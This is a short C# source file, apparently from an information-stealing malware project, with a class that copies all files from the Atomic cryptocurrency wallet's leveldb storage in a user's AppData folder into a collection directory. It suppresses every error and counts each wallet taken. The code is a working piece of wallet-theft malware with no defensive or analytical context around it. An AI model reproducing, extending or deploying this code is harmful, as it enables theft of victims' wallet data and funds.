using System.IO;

namespace SHARP
{
    internal class AtomicWallet
    {
      public static string AtomDir = "\\Wallets\\Atomic\\Local Storage\\leveldb\\";

      public static void AtomicStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\atomic\\Local Storage\\leveldb\\").GetFiles())
          {
            Directory.CreateDirectory(directorypath + AtomicWallet.AtomDir);
            file.CopyTo(directorypath + AtomicWallet.AtomDir + file.Name);
          }
          ++Counting.atomicwallet;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
